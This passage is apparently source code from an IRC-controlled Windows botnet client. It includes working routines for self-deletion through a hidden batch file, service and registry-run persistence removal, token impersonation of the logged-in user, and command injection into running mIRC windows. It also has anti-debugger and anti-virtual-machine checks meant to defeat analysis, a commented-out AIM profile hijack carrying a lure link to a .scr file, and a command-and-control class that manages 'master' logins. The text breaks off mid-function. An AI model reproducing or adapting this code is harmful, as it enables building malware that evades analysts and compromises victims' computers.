// Wildcard function(s) from: http://user.cs.tu-berlin.de/~schintke/references/wildcards/wildcards.c.html
int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}
int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		//case '[':
		//	wildcard++;
		//	fit = set (&wildcard, &test);
		//	break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}
#endif // NO_WILDCARD


#ifndef NO_INSTALLED_TIME
char installedt[128];
void GetInstalledTime(void) {
	if (!installedt) sprintf(installedt,"Error");

	char *query=RegQuery(itkey.hkey,itkey.subkey,itkey.name);
	if (query)
	{
		strncpy(installedt,query,sizeof(installedt)-1);
		return;
	}
	else
	{
		SYSTEMTIME st;
		GetLocalTime(&st);
		char time[128];
		//%.2d-%.2d-%4d
		//st.wMonth, st.wDay, st.wYear
		_snprintf(time, sizeof(time), "%.2d/%.2d/%4d, %.2d:%.2d %s",st.wMonth,st.wDay,st.wYear,HOUR(st.wHour),st.wMinute,AMPM(st.wHour));
		
		if (RegWrite(itkey.hkey,itkey.subkey,itkey.name,time))
		{
			strncpy(installedt,time,sizeof(installedt));
			return;
		}
		else
		{
			//addlogv(ERRORLOG,"Failed to open registry key: \"%s\", error: <%d>.", InstalledTimeKey.subkey, GetLastError());
			return;
		}
	}
	//else
		//addlogv(ERRORLOG,"Failed to open registry key: \"%s\", error: <%d>.", InstalledTimeKey.subkey, GetLastError());

	return;
}
#endif // NO_INSTALLED_TIME
/*
// from: suicide.c
// by:   [ByteRage]
void suicide(unsigned long exitcode)
{
	HMODULE hModule;
	char szModuleName[MAX_PATH];
    hModule = GetModuleHandle(0);
	GetModuleFileName(hModule, szModuleName, sizeof(szModuleName));
	if (GetVersion() & 0x80000000)
	{
		// windows 9x,ME
		__asm
		{
			lea	eax, szModuleName
				push	exitcode
				push	0
				push	eax
				push	ExitProcess
				push	hModule
				push	DeleteFile
				push	FreeLibrary
				ret
		}
	}
	else 
	{
		// windows NT,2K
		CloseHandle(4);
		__asm
		{
			lea	eax, szModuleName
				push	exitcode
				push	0
				push	eax
				push	ExitProcess
				push	hModule
				push	DeleteFile
				push	UnmapViewOfFile
				ret
		}
	}
}
*/
void EraseMe(BOOL nopause/*=FALSE*/)
{
	char buffer[1024], cfilename[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
	sprintf(batfile, "%s\\removeMe%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cfilename,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close.
		// the ping is there to slow it down in case the file cant get erased,
		// dont wanna rape the cpu.
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"ping 0.0.0.0>nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cfilename,cfilename,cfilename);
		}
		else
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cfilename,cfilename,cfilename);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);

		// execute the batch file
		fShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
	}
	
	return;
}

void uninstall(BOOL thread/*=FALSE*/, BOOL difbot/*=FALSE*/)
{
#ifndef NO_SERVICE
	// Erase the service
	SC_HANDLE scm;
	SC_HANDLE service;
	scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS);
	fDeleteService(service);
#else
	RegDelete(runkey.hkey,runkey.subkey,runkey.name);
#endif

	if (difbot)
	{
#ifndef NO_RECORD_UPTIME
		RegDelete(rupkey.hkey,rupkey.subkey,rupkey.name);
#endif

#ifndef NO_INSTALLED_TIME
		RegDelete(itkey.hkey,itkey.subkey,itkey.name);
#endif
	}
	ReleaseMutex(mutex); // release the mutex so it doesn't break the next bot if it uses the same one

	if (!thread)
	{ // ^ so we don't kill the update thread or have the batch trying to erase the new bot

		// kill all threads
		killthreadall();
		// start the batch to erase the bot
		EraseMe();
	}
	return;
}

char *commaI64(unsigned __int64 number)
{
	int counter = 0;

	static char str[50];
	ZeroMemory(str,sizeof(str));

	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

char *commaI64(unsigned __int64 number, char *str)
{
	int counter = 0;
	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

#ifndef NO_SERVICE
DWORD GetExplorerProcessID(void)
{
	HANDLE hProcess;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD Explorer;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	BOOL success = FALSE;

	if (!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		strcpy(szProcessName, "unknown");
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if (NULL != hProcess) {
			if (fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (lstrcmpi("Explorer.exe", szProcessName) == 0) {
					Explorer = aProcesses[i];
					i = cProcesses;
					return Explorer;
				}
			}
		}
	}
	return 0;
}

void ImpersonateInteractiveUser(void)
{
	HANDLE hToken=NULL;                
	HANDLE hProcess=NULL;
	DWORD processID=GetExplorerProcessID();
	if(processID)
	{
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,processID);
		if (hProcess)
		{
			if (fOpenProcessToken(hProcess,TOKEN_QUERY|TOKEN_DUPLICATE,&hToken))
			{
				fImpersonateLoggedOnUser(hToken);
				CloseHandle(hToken);
			}
			CloseHandle(hProcess);
		}
	}
}
#endif

/*
BOOL AIM_Profile(char *msg,BOOL restore)
{
	//char msg[]="OMG WTF LOOK http://www.humanband.com/fire.scr !!!!";
	//char appdata[MAX_PATH];		// finds the location to the application data folder
	//char aimsns[25];				// holds the current aim screen name
	char fbuffer[MAX_PATH];			// holds the full path to the info.htm file
	char bbuffer[MAX_PATH];			// holds the full path to the info.htm file
//	char same[25];					// holds the screen name, used to check if its already been changed
	int i=0,t=0;					// just a little counter

	DWORD buflen=80;				// registry shit
	DWORD maxvalen;					// more of the above
	DWORD numwritten;				// file shit
	DWORD subkeys;					// total keys
	
	char keyname[MAX_KEY_LENGTH];
	DWORD keysize=MAX_KEY_LENGTH;
	FILETIME lpft;
	DWORD dwRet;

	HANDLE dafile;					// the file
	HKEY aimsnz;					// used in getting the longest screen name

	if (!msg)
		return FALSE;

	char *appdata=RegQuery(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders","AppData");
	if (!appdata)
		return FALSE;
	
	//RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_QUERY_VALUE, &apppath);
	//RegQueryValueEx(apppath, "AppData", NULL, NULL, (LPBYTE) appdata, &buflen); // get the appdata folder
	
	if(fRegOpenKeyEx(HKEY_CURRENT_USER, "Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Users", 0, KEY_READ, &aimsnz) == ERROR_SUCCESS)
	{
		if (fRegQueryInfoKey(aimsnz, NULL, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, &maxvalen, NULL, &lpft) == ERROR_SUCCESS)
		{
			if (subkeys)// enumerate the subkeys
			{
		#ifdef _DEBUG
						printf("subkeys: %d\n", subkeys);
		#endif
				for (i=0; i<subkeys; i++,t++) 
				{
					dwRet=fRegEnumKeyEx(aimsnz,i,keyname,&keysize,NULL,NULL,NULL,&lpft); 
				//	fRegEnumKey(aimsnz, i, aimsns, maxvalen); // get the screen name

					if (dwRet == ERROR_SUCCESS) 
					{
		#ifdef _DEBUG
						printf("current screen name = %s\ni = %d\n", keyname, i);
		#endif
						sprintf(fbuffer, "%s\\Aim\\%s\\info.htm", appdata, keyname); // create a buffer with the entire filename
						sprintf(bbuffer, "%s\\Aim\\%s\\info.backup", appdata, keyname); // create a buffer with the entire filename
						if (!restore)
						{
							if (FileExists(fbuffer))
								CopyFile(fbuffer,bbuffer,FALSE);
							else
							{
								CreateFile(bbuffer,GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
								WriteFile(dafile, "", 0, &numwritten,NULL); //write the file
								CloseHandle(dafile);
							}
							dafile = CreateFile(fbuffer,GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // open the file to write
							WriteFile(dafile, msg, sizeof(msg), &numwritten,NULL); //write the file
							CloseHandle(dafile); // close the file :)
						}
						else
						{
							if (FileExists(bbuffer))
								CopyFile(bbuffer,fbuffer,FALSE);
						}
						i++;
					}
				}
			}
			else
				return FALSE;
		}
		else
			return FALSE;
	}
	else
		return FALSE;

	return TRUE;
}*/

#ifndef NO_MIRCCMD //taken from sp0rkeh
BOOL bMircSent;
BOOL CALLBACK mirc(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

BOOL CALLBACK mirc32(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC32"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC32");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

// any command or string sent in SendIrcCommand is sent to all instances of mIRC
BOOL SendIrcCommand(const char *str)
{
	bMircSent=FALSE;
	fEnumWindows((WNDENUMPROC)mirc, (LPARAM)str);
	fEnumWindows((WNDENUMPROC)mirc32, (LPARAM)str);
	return bMircSent;
}
#endif

BOOL IsServiceRunning(char *name)
{
	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;
	
	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			if (!strcmp(enumeration[i].lpServiceName,name))
			{
				if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
				{
					return FALSE;
				}
				else
					return TRUE;
			}
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 
	return FALSE;
}

// Simple function to remove a complete directory
// on NT5 computers (the directory has to be empty,
// this function deletes all child elements 
// recursively.)
// (C) by rattle
// .aware security research
// http://www.awarenetwork.org/
void RemoveCompleteDirectory(char* path)
{
    RemoveDirectory(path);
	
    WIN32_FIND_DATA find; HANDLE hndle;
    char *strFindFiles = (char*) malloc(sizeof(char)*(strlen(path)+4));
    strcpy(strFindFiles,path);
    strcat(strFindFiles,"\\*.*");
    hndle = FindFirstFile(strFindFiles,&find);
	
    while (hndle != INVALID_HANDLE_VALUE) 
    {    
        char *strFolderItem = (char*) malloc(sizeof(char) * (strlen(path)+strlen(find.cFileName)+1));
        strcpy(strFolderItem,path);
        strcat(strFolderItem,"\\");
        strcat(strFolderItem,find.cFileName);
		
        if ((!strcmp(find.cFileName,"."))||(!strcmp(find.cFileName,".."))) 
        {
            RemoveDirectory(strFolderItem);
			
            if (FindNextFile(hndle,&find)) {
                continue;}
			
            else {
                RemoveDirectory(path);
                break; }
        }
		
        if (find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {    
            RemoveCompleteDirectory(strFolderItem);    }
        
        else {
            SetFileAttributes(strFolderItem,FILE_ATTRIBUTE_NORMAL);
            DeleteFile(strFolderItem);}
		
        if (FindNextFile(hndle,&find)) continue;
        else break;
    }
	
    FindClose(hndle);
    SetFileAttributes(path,FILE_ATTRIBUTE_DIRECTORY);
    RemoveDirectory(path);
}





#ifndef NO_DDETECT

#pragma warning(disable:4035)
#pragma warning(disable:4731)

/*	Function: IsSICELoaded
	Description: This method is used by a lot of crypters/compresors it uses INT 41,
				 this interrupt is used by Windows debugging interface to detect if
				 a debugger is present. Only works under Windows.
	Returns: true if a debugger is detected */
__inline bool IsSICELoaded()
{
//	_asm {
//		mov ah, 0x43
//		int 0x68
//		cmp ax, 0x0F386 // Will be set by all system debuggers.
//		jz out_
//
//		xor ax, ax
//		mov es, ax
//		mov bx, word ptr es:[0x68*4]
//		mov es, word ptr es:[0x68*4+2]
//		mov eax, 0x0F43FC80
//		cmp eax, dword ptr es:[ebx]
//		jnz out_
//		jmp normal_
//normal_:
//		xor eax, eax
//		leave
//		ret
//out_:
//		mov eax, 0x1
//		leave
//		ret
//	}
	return FALSE;
}

/*	Function: IsODBGLoaded
	Description: Tests if OllyDbg/other app debuggers is/are enabled
	Returns: true if a debugger is detected */
__inline bool IsODBGLoaded()
{
	char *caption="DAEMON";
	_asm
	{
        push 0x00
        push caption
		
		mov eax, fs:[30h]				// pointer to PEB
		movzx eax, byte ptr[eax+0x2]
		or al,al
		jz normal_
        jmp out_
normal_:
		xor eax, eax
		leave
		ret
out_:
		mov eax, 0x1
		leave
		ret
	}
}

/*	Function: IsSoftIceNTLoaded
	Description: Like the previous one but for use under Win NT only
	Returns: true if SoftIce is loaded */
__inline BOOL IsSoftIceNTLoaded()
{
    HANDLE hFile=CreateFile("\\\\.\\NTICE", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
							NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return TRUE;
	}
    return FALSE;
}

/*	Functions are declared as __inline, this causes the expansion of this code each time a function is invoked, this is to difficult the cracker work by using this function more than once time
	Function: IsBPX
	Description: Checks if the given memory address is a breakpoint
	Returns: true if it is a breakpoint */
__inline bool IsBPX(void *address)
{
	_asm
	{
		mov esi, address	// load function address
		mov al, [esi]		// load the opcode
		cmp al, 0xCC		// check if the opcode is CCh
		je BPXed			// yes, there is a breakpoint
		
		// jump to return true
		xor eax, eax		// false,
		jmp NOBPX			// no breakpoint
BPXed:
		mov eax, 1			// breakpoint found
NOBPX:
	}
}
#pragma warning(default:4731)
#pragma warning(default:4035)

/* executes VMware backdoor I/O function call */
#define VMWARE_MAGIC		0x564D5868	// Backdoor magic number
#define VMWARE_PORT			0x5658		// Backdoor port number
#define VMCMD_GET_VERSION	0x0a		// Get version number

int VMBackDoor(unsigned long *reg_a, unsigned long *reg_b, unsigned long *reg_c, unsigned long *reg_d)
{
	unsigned long a, b, c, d;
	b=reg_b?*reg_b:0;
	c=reg_c?*reg_c:0;
	try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx
			
			mov eax, VMWARE_MAGIC
			mov ebx, b
			mov ecx, c
			mov edx, VMWARE_PORT
			
			in eax, dx
			
			mov a, eax
			mov b, ebx
			mov c, ecx
			mov d, edx
			
			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	} catch(...) {}
	
	if(reg_a)
		*reg_a=a;
	if(reg_b)
		*reg_b=b;
	if(reg_c)
		*reg_c=c;
	if(reg_d)
		*reg_d=d;
	return a;
}

/* Check VMware version only */
int VMGetVersion()
{
	unsigned long version, magic, command;
	command=VMCMD_GET_VERSION;
	VMBackDoor(&version, &magic, &command, NULL);
	if(magic==VMWARE_MAGIC)
		return version;
	else return 0;
}

/* Check if running inside VMWare */
int IsVMWare()
{
	int version=VMGetVersion();
	if(version)
		return TRUE;
	else
		return FALSE;
}

/* Fool ProcDump with increasing size */
void FoolProcDump()
{
	__asm {
		mov eax, fs:[0x30]
		mov eax, [eax+0xC]
		mov eax, [eax+0xC]
		add dword ptr [eax+0x20], 0x2000	// increase size variable
	}
}

/* Screw with Connectix VirtualPC */
#define vpcscreen __asm _emit 0x0F __asm _emit 0x3F __asm _emit 0x01 __asm _emit 0x0C
#define vpcadditions __asm _emit 0x0F __asm _emit 0x3F __asm _emit 0x05 __asm _emit 0x01
void ScrewWithVirtualPC()
{
/*
	try {
		__asm {
			// set Virtual PC screen size to 10x20.
			mov ecx, 10
			mov edx, 20
			vpcscreen
			
			// disable Virtual PC Additions.
			vpcadditions
		}
	} catch(...) {
	}
*/
}

typedef BOOL (*pfnIsDebuggerPresent)(void);
BOOL IsDebug=FALSE;
BOOL IsBugged()
{
#ifdef _DEBUG
	return FALSE;
#else

	if(IsDebug)
		return true;

	pfnIsDebuggerPresent IsDbgPresent=NULL;
	HMODULE hK32=GetModuleHandle("KERNEL32.DLL");
	if(!hK32)
		hK32=LoadLibrary("KERNEL32.DLL");

	if(hK32)
		IsDbgPresent=(pfnIsDebuggerPresent)GetProcAddress(hK32, "IsDebuggerPresent");

	FoolProcDump();
	ScrewWithVirtualPC();

	unsigned long lStartTime=GetTickCount();

	if(IsBPX(&IsBPX))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsBPX, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}
	
	if(IsBPX(&IsSICELoaded))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsSICELoaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsBPX(&IsSoftIceNTLoaded))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsSoftIceNTLoaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	//if(IsBPX(&IsVMWare))
	if(IsBPX(&IsVMWare))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsVMWare, debugger active...\n");
//#endif // DBGCONSOLE
	}

//	if(IsVMWare())
//	{
////#ifdef DBGCONSOLE
////		g_cConsDbg.Log(5, "Running inside VMWare, probably honeypot...\n");
////#endif // DBGCONSOLE
//		IsDebug=TRUE;
//		return TRUE;
//	}

	if (RegExists(HKEY_LOCAL_MACHINE,"SOFTWARE\\VMware, Inc.\\VMware Tools","InstallPath",REG_SZ))
	{
		IsDebug=TRUE;
		return TRUE;
	}
	
	if (RegExists(HKEY_LOCAL_MACHINE,"SOFTWARE\\VMware, Inc.\\VMware Tools","ShowTray",REG_DWORD))
	{
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsSoftIceNTLoaded())
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "SoftIce named pipe exists, maybe debugger is active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsSICELoaded())
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "SoftIce is loaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsDbgPresent)
	{
		if(IsBPX(&IsDbgPresent))
		{
//#ifdef DBGCONSOLE
//			g_cConsDbg.Log(5, "Breakpoint set on IsDebuggerPresent, debugger active...\n");
//#endif // DBGCONSOLE
			IsDebug=TRUE;
			return TRUE;
		}

		if(IsDbgPresent())
		{
//#ifdef DBGCONSOLE
//			g_cConsDbg.Log(5, "IsDebuggerPresent returned true, debugger active...\n");
//#endif // DBGCONSOLE
			IsDebug=TRUE;
			return TRUE;
		}
	}


	if((GetTickCount()-lStartTime) > 5000)
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Routine took too long to execute, probably single-step...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}
	return FALSE;

#endif // _DEBUG
}

#endif





logged_in logins[MAX_LOGINS];

IRC::IRC()
{
	hooks=0;
	clear_logins();
	connected=false;
	bconnect=true;
	cur_nick=0;

#ifndef NO_OPENSSL
	// Initialize SSL Socket
	ssl_socket.Init();
#endif NO_OPENSSL
}

IRC::~IRC()
{
	if (hooks)
		delete_irc_command_hook(hooks);
}

DWORD dwLastRecv;
DWORD WINAPI PingTimeoutThread(LPVOID param)
{
	NTHREAD timeout = *((NTHREAD *)param);
	NTHREAD *timeouts = (NTHREAD *)param;
	timeouts->gotinfo = TRUE;
	IRC* irc=(IRC*)timeout.conn;

	while(1)
	{
		if (((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)
		{
			irc->quit("Ping Timeout? (%d-%d)%d/%d",(GetTickCount()/1000),(dwLastRecv/1000),((GetTickCount()/1000)-(dwLastRecv/1000)),PING_TIMEOUT);
			ExitThread(0);
		}
#ifdef _DEBUG
		printf("PingTimeoutThread: %d-%d=%d>%d?%s\n",(GetTickCount()/1000),(dwLastRecv/1000),(GetTickCount()/1000)-(dwLastRecv/1000),PING_TIMEOUT,(((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)?"TRUE":"FALSE");
#endif
		Sleep(PING_TIMEOUT*1000);
	}
	ExitThread(0);
}

/////////////////////////////////////////////////////////////////////////////isend
int IRC::isend(int socket, char *data, ...)
{
	char tbuffer[IRCLINE];

	va_list argp;
	va_start(argp,data); 
	_vsnprintf(tbuffer,sizeof(tbuffer),data,argp);
	
#ifdef _DEBUG
	char ntbuffer[IRCLINE];
	strcpy(ntbuffer,tbuffer);
	for (unsigned int i=strlen(ntbuffer);i>strlen(ntbuffer)-2;i--)
		if (ntbuffer[i]=='\r' || ntbuffer[i]=='\n')
		{
			ntbuffer[i]=0;
		}
	printf("(out) %s\n",ntbuffer);
	DbgPrintFile("(out) %s\n",ntbuffer);
#endif // _DEBUG

#ifndef NO_OPENSSL
	if (servers[curserver].usessl)
	{
		if (ssl_socket.Write(tbuffer, strlen(tbuffer))<strlen(tbuffer))
		{
			//m_bJoined=false;
			connected=false;
			fclosesocket(irc_socket);
			irc_socket=INVALID_SOCKET;
			clear_logins();
			return 0;
		}
		else
			return 1;
	}
	else
	{
#endif
		if (fsend(socket,tbuffer,strlen(tbuffer),0)==SOCKET_ERROR)
			return 1;
		else
			return 0;
#ifndef NO_OPENSSL
	}
#endif
}

/////////////////////////////////////////////////////////////////////////////insert_irc_command_hook
void IRC::insert_irc_command_hook(irc_command_hook* hook, char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (hook->function)
	{
		if (!hook->next)
		{
			hook->next=new irc_command_hook;
			hook->next->function=0;
			hook->next->irc_command=0;
			hook->next->next=0;
		}
		insert_irc_command_hook(hook->next, cmd_name, function_ptr);
	}
	else
	{
		hook->function=function_ptr;
		hook->irc_command=new char[strlen(cmd_name)+1];
		strcpy(hook->irc_command, cmd_name);
	}
}

/////////////////////////////////////////////////////////////////////////////hook_irc_command
void IRC::hook_irc_command(char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (!hooks)
	{
		hooks=new irc_command_hook;
		hooks->function=0;
		hooks->irc_command=0;
		hooks->next=0;
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
	else
	{
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
}

/////////////////////////////////////////////////////////////////////////////delete_irc_command_hook
void IRC::delete_irc_command_hook(irc_command_hook* cmd_hook)
{
	if (cmd_hook->next)
		delete_irc_command_hook(cmd_hook->next);
	if (cmd_hook->irc_command)
		delete cmd_hook->irc_command;
	delete cmd_hook;
}

/////////////////////////////////////////////////////////////////////////////add_login
int IRC::add_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL s=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] == '\0')
		{
			strcpy(logins[i].nick, nick);
			strcpy(logins[i].ident,ident);
			strcpy(logins[i].host, host);
			s=TRUE;
			break;
		}
	}

	if (s)
		return i;
	else
		return -1;
}

/////////////////////////////////////////////////////////////////////////////del_login
int IRC::del_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL bs=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] != '\0')
		{
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
			{
				bs=TRUE;
				del_login(i);
				break;
			}
		}
	}
	if (bs)
		return i;
	else
		return -1;
}

/////////////////////////////////////////////////////////////////////////////clear_logins
void IRC::clear_logins(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
	}
}

/////////////////////////////////////////////////////////////////////////////del_login
BOOL IRC::del_login(int i)
{
	if (logins[i].nick[0]!='\0')
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
		return TRUE;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////is_logged_in
BOOL IRC::is_logged_in(const char* nick, const char* ident, const char* host)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
				return TRUE;
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////has_master
BOOL IRC::has_master(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			return TRUE;
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////list_logins
void IRC::list_logins(char* target)
{
	privmsg(target,"%s Login List:", main_title);
	for (int i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] != '\0')
